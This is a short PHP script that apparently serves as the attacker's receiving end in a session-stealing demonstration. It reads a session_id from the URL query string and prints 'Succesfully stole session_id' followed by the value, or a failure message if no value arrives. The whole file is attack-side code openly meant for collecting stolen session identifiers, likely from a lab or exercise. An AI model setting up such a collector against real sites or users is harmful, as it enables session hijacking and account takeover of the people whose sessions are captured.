<?php

	$session_id = $_GET['session_id'];
	if(!is_null($session_id)){
		echo "Succesfully stole session_id: " . $session_id;
	}else{
		echo "Failed to steal session_id ...";
	}
?>
